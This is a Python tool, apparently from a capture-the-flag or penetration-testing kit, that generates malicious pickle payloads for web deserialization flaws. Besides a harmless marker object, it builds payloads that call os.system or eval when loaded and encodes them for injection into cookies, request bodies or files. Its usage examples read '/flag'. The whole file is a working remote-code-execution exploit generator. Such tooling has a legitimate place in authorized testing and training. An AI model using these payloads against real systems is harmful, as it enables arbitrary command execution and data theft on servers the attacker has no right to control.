#!/usr/bin/env python3
"""pickle_gen.py — pickle payload builder for confirmed deserialization sinks.

The web-deserialization workflow is: corrupted-object differential (cheap,
already covered by http_probe), then a BENIGN marker object to prove the
loader really unpickles, and only then an execution form. This builds all
three byte shapes with stdlib pickle — no gadget framework needed — and
prints them base64/hex/raw so they drop into a cookie, body or file. The
marker form exists because the class demands a non-destructive confirm:
a returned 'PWNED-…' string in the app's output is evidence the loader ran
your object; an RCE form is for the already-confirmed sink.

    python3 tools/pickle_gen.py --marker canary1          # benign __reduce__ marker
    python3 tools/pickle_gen.py --cmd 'cat /flag'         # os.system reduce
    python3 tools/pickle_gen.py --eval 'open("/flag").read()'  # builtins eval
    python3 tools/pickle_gen.py --selftest
"""
from __future__ import annotations

import argparse
import base64
import json
import pickle
import pickletools
import sys


class _Marker:
    """reduce() to a harmless tuple — proves the loader ran our object."""

    def __init__(self, tag: str):
        self.tag = tag

    def __reduce__(self):
        return (str, (f"PWNED-{self.tag}",))


class _OsSystem:
    def __init__(self, cmd: str):
        self.cmd = cmd

    def __reduce__(self):
        import os
        return (os.system, (self.cmd,))


class _Eval:
    def __init__(self, expr: str):
        self.expr = expr

    def __reduce__(self):
        return (eval, (self.expr,))


def build(kind: str, arg: str, protocol: int = 4) -> dict:
    obj = {"marker": _Marker, "cmd": _OsSystem, "eval": _Eval}[kind](arg)
    raw = pickle.dumps(obj, protocol=protocol)
    ops = [op.name for op, _, _ in pickletools.genops(raw)]
    return {"kind": kind, "protocol": protocol, "bytes": len(raw),
            "opcodes_used": sorted(set(ops)),
            "b64": base64.b64encode(raw).decode(),
            "hex": raw.hex(),
            "shape": {"marker": "str('PWNED-<tag>') — appears in output if unpickled",
                      "cmd": "os.system(<cmd>) — runs on load",
                      "eval": "builtins.eval(<expr>) — evaluates on load"}[kind],
            "note": "for a CONFIRMED deserialization sink only; the corrupted-object "
                    "differential and the marker confirm come first"}


def _selftest() -> int:
    m = build("marker", "canary1")
    assert pickle.loads(base64.b64decode(m["b64"])) == "PWNED-canary1"
    e = build("eval", "1+2")
    assert pickle.loads(base64.b64decode(e["b64"])) == 3
    c = build("cmd", "echo ok")
    assert "REDUCE" in c["opcodes_used"] or "STACK_GLOBAL" in c["opcodes_used"]
    # marker really is benign: loads to a str, no os import on the wire
    assert b"system" not in base64.b64decode(m["b64"])
    print("pickle_gen selftest: ok")
    return 0


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0],
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    g = ap.add_mutually_exclusive_group()
    g.add_argument("--marker", metavar="TAG", help="benign confirm object")
    g.add_argument("--cmd", metavar="CMD", help="os.system payload")
    g.add_argument("--eval", dest="expr", metavar="EXPR", help="eval payload")
    ap.add_argument("--protocol", type=int, default=4)
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)
    if args.selftest:
        return _selftest()
    kind = "marker" if args.marker else "cmd" if args.cmd else "eval" if args.expr else None
    if not kind:
        ap.print_help()
        return 2
    out = build(kind, args.marker or args.cmd or args.expr, args.protocol)
    print(json.dumps(out, indent=1))
    return 0


if __name__ == "__main__":
    sys.exit(main())
